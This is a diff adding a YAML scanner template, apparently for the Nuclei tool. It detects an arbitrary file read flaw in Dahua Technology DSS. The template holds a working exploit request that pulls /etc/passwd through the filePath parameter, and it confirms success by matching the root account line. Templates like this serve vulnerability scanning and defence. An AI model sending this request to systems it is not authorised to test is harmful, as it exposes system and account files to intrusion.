@@ -1,0 +1,23 @@
+id: dahuatech-dss-readfile-cnvd-2020-61986
+info:
+  name: Dahua Technology DSS Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Exploits a vulnerability in Dahua Technology DSS allowing arbitrary file read.
+  reference:
+    - https://forum.butian.net/share/141
+http:
+  - raw:
+      - |
+        GET /itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
